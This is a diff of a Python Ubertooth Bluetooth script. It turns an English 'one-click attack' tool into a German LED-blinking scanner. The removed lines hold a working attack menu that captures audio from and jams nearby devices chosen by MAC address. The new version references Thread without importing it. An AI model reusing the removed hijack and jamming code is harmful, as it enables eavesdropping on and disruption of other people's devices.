@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# UBERTOOTH ONE-CLICK-ATTACK v666 - SCAN & DESTROY
+# UBERTOOTH LED SCANNER v666 - MIT SICHTBAREM BLINKEN
 
 import os
 import sys
@@ -8,23 +8,30 @@ import re
 import time
 import signal
 import subprocess
-from datetime import datetime
+import usb.core
 import colorama
 from colorama import Fore, Style
 
 colorama.init()
 
-class UberOneClickAttacker:
+class UberLedScanner:
     def __init__(self):
         self.targets = []
         self.running = True
         signal.signal(signal.SIGINT, self.cleanup)
         self.check_root()
+        self.check_ubertooth()
         self.show_banner()
 
     def check_root(self):
         if os.geteuid() != 0:
             print(f"{Fore.RED}🚫 Run as root: sudo {sys.argv[0]}{Style.RESET_ALL}")
+            sys.exit(1)
+
+    def check_ubertooth(self):
+        dev = usb.core.find(idVendor=0x1D50, idProduct=0x6002)
+        if not dev:
+            print(f"{Fore.RED}🚨 Ubertooth not found!{Style.RESET_ALL}")
             sys.exit(1)
 
     def show_banner(self):
@@ -36,119 +43,71 @@ class UberOneClickAttacker:
   |___| |_| |_| |_|___| |_| |_|\___/
                                      
  ------------------------------------
-    UBERTOOTH ONE-CLICK-ATTACK v666
-   • Scan & Immediate Attack •
-   • No Extra Menus Needed  •
+    UBERTOOTH LED SCANNER v666
+   • Sichtbares Blinken während Scan •
+   • Kein Zweifel ob es arbeitet    •
  ------------------------------------
 {Style.RESET_ALL}""")
 
+    def blink_led(self, duration=15):
+        """Blinkt die LED während des Scans"""
+        print(f"{Fore.YELLOW}💡 LED blinkt jetzt während des Scans...{Style.RESET_ALL}")
+        os.system("ubertooth-util -l")  # LED blinken starten
+        time.sleep(duration)
+        os.system("ubertooth-util -L")  # LED ausschalten
+
     def scan_devices(self):
-        """Scan with combined ubertooth-scan and hcitool"""
+        """Scannt Geräte mit sichtbarem LED-Blinken"""
         self.show_banner()
+        
+        # Starte LED-Blinken in einem separaten Thread
+        led_thread = Thread(target=self.blink_led)
+        led_thread.start()
+        
+        # Haupt-Scan
         print(f"{Fore.CYAN}🔍 Scanning for targets (15 seconds)...{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}MAC-Address       Device Name{Style.RESET_ALL}")
-        print("-" * 40)
+        result = subprocess.run(["ubertooth-scan", "-t", "15"], 
+                              capture_output=True, text=True)
         
-        # Start scan processes
-        ubertooth_proc = subprocess.Popen(["ubertooth-scan", "-t", "15"], 
-                                        stdout=subprocess.PIPE,
-                                        stderr=subprocess.PIPE,
-                                        text=True)
-        
-        hcitool_proc = subprocess.Popen(["hcitool", "scan", "--flush"],
-                                      stdout=subprocess.PIPE,
-                                      stderr=subprocess.PIPE,
-                                      text=True)
-        
-        # Process outputs
+        # Parse Ergebnisse
         self.targets = []
-        device_names = {}
-        
-        # Get device names first
-        for line in hcitool_proc.stdout:
-            if ':' in line:
-                parts = line.strip().split('\t')
-                if len(parts) >= 2:
-                    device_names[parts[1]] = parts[2] if len(parts) > 2 else 'Unknown'
-        
-        # Process ubertooth results
-        for line in ubertooth_proc.stdout:
+        for line in result.stdout.split('\n'):
             if 'BD_ADDR' in line:
                 mac = re.search(r'(([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})', line)
                 if mac:
-                    mac_addr = mac.group(1)
-                    name = device_names.get(mac_addr, 'Unknown')
-                    self.targets.append({
-                        'mac': mac_addr,
-                        'name': name
-                    })
-                    # Display immediately
-                    print(f"{mac_addr}  {name}")
+                    self.targets.append(mac.group(1))
         
+        led_thread.join()  # Warte bis LED-Thread fertig ist
         return len(self.targets) > 0
 
-    def attack_menu(self):
-        """Show immediate attack options after scan"""
+    def show_results(self):
+        """Zeigt Scan-Ergebnisse"""
         self.show_banner()
-        print(f"{Fore.GREEN}=== SCAN RESULTS ==={Style.RESET_ALL}")
+        print(f"\n{Fore.GREEN}=== GEFUNDENE ZIELE ==={Style.RESET_ALL}")
         for i, target in enumerate(self.targets, 1):
-            print(f"{i}. {target['mac']} - {target['name']}")
-        
-        print(f"\n{Fore.RED}=== ATTACK OPTIONS ==={Style.RESET_ALL}")
-        print("1. Audio Hijacking")
-        print("2. Bluetooth Jamming")
-        print("3. Back to Scan")
-        
-        choice = input("\nSelect target number or option: ")
-        
-        if choice == "1":
-            target_idx = int(input("Target number to hijack: ")) - 1
-            self.audio_hijack(self.targets[target_idx])
-        elif choice == "2":
-            target_idx = int(input("Target number to jam: ")) - 1
-            self.jam_target(self.targets[target_idx])
-        elif choice == "3":
-            return
-        else:
-            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
-            time.sleep(1)
-
-    def audio_hijack(self, target):
-        """Capture audio from target"""
-        filename = f"hijack_{target['mac'].replace(':', '')}.pcap"
-        print(f"{Fore.RED}🎙️ Hijacking {target['name']}... (Stop with Ctrl+C){Style.RESET_ALL}")
-        os.system(f"ubertooth-bt -S -t {target['mac']} -c {filename}")
-
-    def jam_target(self, target):
-        """Jam target device"""
-        print(f"{Fore.RED}📶 Jamming {target['name']}... (Stop with Ctrl+C){Style.RESET_ALL}")
-        os.system(f"ubertooth-jam -b -t {target['mac']}")
+            print(f"{i}. {target}")
+        print("\n")
 
     def cleanup(self, sig=None, frame=None):
-        print(f"\n{Fore.RED}💀 Killing all processes...{Style.RESET_ALL}")
-        os.system("pkill -f 'ubertooth|hcitool'")
+        print(f"\n{Fore.RED}🛑 Beende alle Prozesse...{Style.RESET_ALL}")
+        os.system("ubertooth-util -L")  # LED ausschalten
+        os.system("pkill -f 'ubertooth'")
         sys.exit(0)
 
     def main(self):
         while self.running:
             if self.scan_devices():
-                self.attack_menu()
+                self.show_results()
+                input("Drücke Enter für neuen Scan...")
             else:
-                print(f"{Fore.RED}No devices found! Retrying...{Style.RESET_ALL}")
+                print(f"{Fore.RED}Keine Geräte gefunden!{Style.RESET_ALL}")
                 time.sleep(2)
 
 if __name__ == "__main__":
-    # Check dependencies
-    required = ['ubertooth-scan', 'hcitool']
-    missing = [cmd for cmd in required if not subprocess.getoutput(f"which {cmd}")]
-    if missing:
-        print(f"{Fore.RED}Missing tools: {', '.join(missing)}{Style.RESET_ALL}")
-        sys.exit(1)
-    
-    attacker = UberOneClickAttacker()
+    scanner = UberLedScanner()
     try:
-        attacker.main()
+        scanner.main()
     except Exception as e:
         print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
     finally:
-        attacker.cleanup()
+        scanner.cleanup()
